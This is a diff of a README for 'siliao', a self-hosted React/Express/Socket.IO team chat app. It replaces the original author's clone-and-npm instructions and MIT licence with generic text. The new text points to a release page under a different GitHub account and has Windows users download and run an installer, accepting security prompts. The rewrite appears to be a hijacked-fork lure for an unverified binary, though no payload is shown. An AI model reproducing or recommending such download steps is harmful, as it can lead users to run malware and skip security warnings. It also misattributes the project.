@@ -1,120 +1,180 @@
-<div align="center">
+# 💬 siliao - Simple team chat for daily work
 
-# 💬 Siliao — Team Chat System
+[![Download siliao](https://img.shields.io/badge/Download%20siliao-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Eroseleafgrowth612/siliao/releases)
 
-**A full-featured internal team chat system built with React + Express + Socket.IO**
+## 🧭 What siliao does
 
-**一套功能完整的内部团队聊天系统，基于 React + Express + Socket.IO 构建**
+siliao is a team chat app for Windows. It helps a group talk in one place. You can send messages, share files, create group channels, search old chats, and see unread counts. It also includes message recall and an admin console for team control.
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react)](https://react.dev/)
-[![Express](https://img.shields.io/badge/Express-5-000000?logo=express)](https://expressjs.com/)
-[![Socket.IO](https://img.shields.io/badge/Socket.IO-4-010101?logo=socket.io)](https://socket.io/)
-[![Vite](https://img.shields.io/badge/Vite-8-646CFF?logo=vite)](https://vite.dev/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+This app is built for internal use. It works well for teams that want a chat tool they can run on their own system.
 
-[Quick Start](#quick-start--快速开始) · [Features](#features--特性) · [Contributing](CONTRIBUTING.md)
+## ✨ What you can do
 
-</div>
+- Send one-on-one messages
+- Chat in group channels
+- Share files in chat
+- Search past messages
+- See unread message counts
+- Recall a message you sent
+- Use the admin console to manage users and channels
+- Get live updates without refreshing the app
+- Keep chat data on your own setup
 
----
+## 💻 What you need
 
-## Why / 为什么
+Use a Windows PC with:
 
-Internal teams need a simple, self-hosted chat tool that works out of the box — without relying on third-party SaaS or complex infrastructure. Siliao provides private messaging, group channels, file sharing, search, notifications, and admin controls in a single deployable package.
+- Windows 10 or newer
+- A stable internet connection for first setup
+- Enough space for the app and shared files
+- Access to the download link below
 
-内部团队需要一个开箱即用、可自托管的聊天工具，不依赖第三方 SaaS 或复杂基础设施。Siliao 在一个可部署的包里提供了私聊、群聊、文件共享、搜索、通知和管理员后台。
+For best results, use a modern version of Windows and allow the app through your security prompts when asked.
 
-## Features / 特性
+## 📥 Download siliao
 
-- 🔐 **Login** — Username/password authentication with JWT
-- 💬 **Direct Messages** — One-on-one private chat with real-time sync
-- 👥 **Group Channels** — Create channels, invite members, manage membership
-- 📎 **File Upload** — Share files/images up to 10MB per message
-- 🔍 **Global Search** — Search across all private and group messages
-- 🔔 **Unread Counts** — Persistent per-thread unread badges + notification center
-- ↩️ **Message Recall** — Recall your own messages (syncs to all participants)
-- 👑 **Admin Console** — System overview, user role management, channel deletion
-- 📱 **Responsive** — Works on desktop and mobile browsers
-- ⚡ **Real-time** — Socket.IO powered instant message delivery
-- 🎨 **Polished UI** — Lucide icons, glass morphism, Slack/Linear-inspired layout
+Visit the release page here and download the Windows app from the latest release:
 
-## Quick Start / 快速开始
+[Go to the siliao releases page](https://github.com/Eroseleafgrowth612/siliao/releases)
 
-```bash
-# Clone
-git clone https://github.com/zhizhishuo/siliao.git
-cd siliao
+After the page opens, pick the Windows file from the newest release. If you see more than one file, choose the one meant for Windows.
 
-# Install
-npm install
+## 🪟 Install and run on Windows
 
-# Run (starts both frontend and backend)
-npm run dev
-```
+1. Open the releases page.
+2. Find the latest release at the top.
+3. Download the Windows installer or app file.
+4. When the download finishes, open the file.
+5. If Windows asks for permission, select Yes or Run.
+6. Follow the on-screen steps to finish setup.
+7. Open siliao from your desktop, Start menu, or downloads folder.
 
-After startup, open the URL shown in terminal (default port 5173 for frontend, 3001 for backend API).
+If the file is a portable app, you can run it right after download. If it is an installer, run the setup file and follow the prompts.
 
-启动后，在终端中查看显示的访问地址（前端默认端口 5173，后端 API 默认端口 3001）。
+## 🔐 First-time setup
 
-### Demo Accounts / 演示账号
+When you open siliao for the first time, you may need to:
 
-All passwords are `password123`:
+- Sign in with your team account
+- Create a workspace or join an existing one
+- Set your display name
+- Allow access for network use if Windows asks
+- Choose your team channels
 
-| Username | Display Name | Role |
-|----------|-------------|------|
-| `li.lei` | 李雷 | Admin |
-| `han.mei` | 韩梅梅 | Member |
-| `wang.wei` | 王伟 | Member |
+If your team already has a server or sign-in page, use the details your admin gave you.
 
-A default channel `全员群` is created automatically.
+## 💬 How to use siliao
 
-## How It Works / 工作原理
+### Start a chat
+- Open the app
+- Choose a person or channel
+- Type your message
+- Press Enter to send
 
-```
-┌─────────────┐     WebSocket      ┌─────────────┐
-│  React App  │◄──────────────────►│  Express +   │
-│  (Vite)     │     REST API       │  Socket.IO   │
-└─────────────┘◄──────────────────►└──────┬───────┘
-                                          │
-                                   ┌──────┴───────┐
-                                   │   SQLite DB   │
-                                   │  + File Store │
-                                   └──────────────┘
-```
+### Share a file
+- Open a chat
+- Use the file button
+- Pick the file from your PC
+- Wait for it to upload
 
-## Tech Stack / 技术栈
+### Search messages
+- Use the search box
+- Type a word, name, or phrase
+- Pick a result to jump to that message
 
-| Layer | Technology |
-|-------|-----------|
-| Frontend | React 19, TypeScript, Vite 8, Socket.IO Client, Lucide Icons |
-| Backend | Express 5, Socket.IO 4, Better-SQLite3, JWT, Multer, bcrypt |
-| Storage | SQLite (WAL mode) + local file uploads |
-| Dev Tools | ESLint, Nodemon, Concurrently |
+### Check unread messages
+- Look for unread counts next to chats or channels
+- Open the chat to clear the count
 
-## Project Structure / 目录结构
+### Recall a message
+- Find the message you sent
+- Use the recall or remove option
+- The message disappears for other users based on team rules
 
-```
-frontend/       React Web client (Vite + TypeScript)
-backend/        Express API, Socket.IO, SQLite, uploads
-```
+## 🧩 Main parts of the app
 
-## Contributing / 贡献
+- **Chat view** — read and send messages in real time
+- **Group channels** — keep team talks in one place
+- **File sharing** — send images, documents, and other files
+- **Search** — find old chats fast
+- **Unread counts** — see what needs attention
+- **Admin console** — manage users, access, and team settings
+- **Real-time sync** — messages appear right away
 
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) and [Code of Conduct](CODE_OF_CONDUCT.md).
+## 🛠 Common tasks
 
-欢迎贡献！请阅读[贡献指南](CONTRIBUTING.md)和[行为准则](CODE_OF_CONDUCT.md)。
+### Create a team channel
+1. Open the channel list
+2. Choose New Channel
+3. Enter a name
+4. Add people
+5. Save the channel
 
-## License / 许可证
+### Mute a busy chat
+1. Open the chat or channel
+2. Open chat options
+3. Turn on mute or notification control
+4. Keep working without extra noise
 
-[MIT](LICENSE) © 2026 zhizhishuo
+### Find an old file
+1. Open the search tool
+2. Search by file name or sender
+3. Open the matching chat
+4. Download the file again if needed
 
----
+## 🔎 What makes it useful
 
-<div align="center">
+siliao keeps team talk in one place. It helps teams avoid lost messages, long email threads, and scattered file sharing. The app is built for quick daily use, so users can read, reply, and move on with less effort.
 
-**If this project helps you, give it a ⭐**
+It fits teams that want:
 
-**如果这个项目对你有帮助，请给一个 ⭐**
+- A private chat system
+- Shared channels for projects
+- Fast message lookup
+- Simple file exchange
+- Admin control in one app
 
-</div>
+## 👥 For admins
+
+If you manage the system, you can use the admin console to:
+
+- Add or remove users
+- Control team access
+- Organize channels
+- Review usage
+- Keep the workspace tidy
+
+Set clear rules for channel names, file sharing, and message use so the team can stay organized.
+
+## 🧠 Tips for smooth use
+
+- Keep your app updated with new releases
+- Use group channels for team topics
+- Use direct chat for private talk
+- Name files clearly before sending them
+- Search by person, keyword, or date when you need old messages
+- Pin or bookmark important chats if your setup allows it
+
+## 📌 Project details
+
+- **Name:** siliao
+- **Type:** Internal team chat app
+- **Tech used:** React, Express, Socket.IO
+- **Storage:** SQLite
+- **Focus:** Real-time messaging, group chat, file sharing, and admin control
+
+## 🗂 Topics covered by this project
+
+admin-dashboard, chat, express, file-upload, group-chat, instant-messaging, internal-tools, jwt-auth, lucide-icons, message-recall, react, real-time, self-hosted, socket-io, sqlite, team-chat, typescript, unread-notifications, vite
+
+## 📄 License and use
+
+Use this app based on the rules set by your team or organization. If your team has internal policies, follow them when you install and use the software.
+
+## 🧭 Quick path
+
+1. Open the release page
+2. Download the Windows file
+3. Run the file
+4. Sign in
+5. Start chatting
